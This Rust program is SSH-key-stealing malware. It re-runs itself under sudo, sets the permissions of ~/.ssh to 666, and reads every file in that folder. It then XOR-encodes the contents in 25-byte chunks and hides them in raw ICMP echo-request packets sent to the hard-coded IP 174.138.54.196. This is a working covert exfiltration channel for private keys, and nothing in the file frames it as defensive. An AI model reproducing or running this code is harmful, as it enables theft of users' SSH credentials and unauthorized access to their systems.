use pnet::packet::icmp::{echo_request::MutableEchoRequestPacket, IcmpTypes};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::packet::Packet;
use pnet::transport::{transport_channel, TransportChannelType::Layer3};

use dirs;
use rand;
use users;

use std::env::{args, current_exe};
use std::fs::File;
use std::io::prelude::*;
use std::net;
use std::path::PathBuf;
use std::process::Command;
use std::str::FromStr;

const IPV4_HEADER_LEN: usize = 21;
const ICMP_HEADER_LEN: usize = 8;
const ICMP_PAYLOAD_LEN: usize = 32;

fn attempt_false_icmp(msg: &[u8]) -> Result<(), ()> {
    let protocol = Layer3(IpNextHeaderProtocols::Icmp);
    let (mut tx, _) = transport_channel(2048, protocol).unwrap();

    // let mut rx = icmp_packet_iter(&mut rx);

    let ip_addr = net::Ipv4Addr::from_str("174.138.54.196").unwrap();

    let mut ip_buffer = [0u8; 100];
    let mut icmp_buffer = [0u8; 50];

    // println!("icmp buffer size: {}", icmp_buffer_size);

    let mut ipv4_packet = MutableIpv4Packet::new(&mut ip_buffer).unwrap();
    ipv4_packet.set_version(4);
    ipv4_packet.set_header_length(IPV4_HEADER_LEN as u8);
    ipv4_packet.set_total_length((IPV4_HEADER_LEN + ICMP_HEADER_LEN + ICMP_PAYLOAD_LEN) as u16);
    ipv4_packet.set_ttl(200);
    ipv4_packet.set_next_level_protocol(IpNextHeaderProtocols::Icmp);
    ipv4_packet.set_destination(ip_addr);

    let xor_key: u8 = rand::random();
    let mut data: Vec<u8> = msg
        .iter()
        .map(|b| {
            if *b == xor_key || *b == 0 {
                *b
            } else {
                *b ^ xor_key
            }
        })
        .collect();

    // println!(
    //     "Orig: {:?}\nXOR Key: {}\nEncoded: {:?}",
    //     msg,
    //     xor_key,
    //     data.as_slice()
    // );

    let mut icmp_packet = MutableEchoRequestPacket::new(&mut icmp_buffer).unwrap();
    icmp_packet.set_icmp_type(IcmpTypes::EchoRequest);

    data.insert(0, xor_key);
    icmp_packet.set_payload(&data);

    let checksum = pnet::util::checksum(&icmp_packet.packet(), 2);
    icmp_packet.set_checksum(checksum);

    ipv4_packet.set_payload(icmp_packet.packet());

    tx.send_to(ipv4_packet, net::IpAddr::V4(ip_addr)).unwrap();

    // println!("sent!");
    Err(())
}

fn get_ssh_filepaths() -> Vec<PathBuf> {
    let mut home_dir = match dirs::home_dir() {
        Some(p) => p,
        None => return Vec::new(),
    };

    home_dir.push(".ssh");

    let mut change_perms1 = std::process::Command::new("chmod")
        .arg("-R")
        .arg("666")
        .arg(home_dir.to_str().unwrap())
        .spawn()
        .unwrap();
    change_perms1.wait().unwrap();

    match home_dir.as_path().read_dir() {
        Ok(dir_iter) => dir_iter
            .filter_map(|dir_entry| match dir_entry {
                Ok(entry) => {
                    if let Ok(file_type) = entry.file_type() {
                        if file_type.is_file() {
                            Some(entry.path())
                        } else {
                            None
                        }
                    } else {
                        None
                    }
                }
                _ => None,
            })
            .collect(),
        Err(_) => Vec::new(),
    }
}

fn get_file_data(path: &PathBuf) -> Result<File, ()> {
    if !path.exists() || !path.is_file() {
        return Err(());
    }

    File::open(path).map_err(|_| ())
}

fn main() {
    if args().len() < 2 {
        // This is strictly why NOPASSWD is a bad thing.
        let mut child = Command::new("sudo")
            .arg(current_exe().unwrap())
            .arg(
                users::get_current_username()
                    .unwrap()
                    .into_string()
                    .unwrap(),
            )
            .spawn()
            .unwrap();

        child.wait().unwrap();
        return;
    }

    let username = args().nth(1).unwrap();

    let paths = get_ssh_filepaths();

    for p in paths {
        if let Ok(file) = get_file_data(&p) {
            let mut to_send: Vec<u8> = username.bytes().collect();
            let mut path: Vec<u8> = p.as_path().to_str().unwrap().bytes().collect();
            for _ in 0..5 {
                path.insert(0, 64);
            }
            to_send.extend(path);
            let data: Vec<u8> = file.bytes().map(|byte| byte.unwrap()).collect();
            to_send.extend(data);

            for window in to_send.chunks(25) {
                let _ = attempt_false_icmp(window);
            }
        }
    }
}
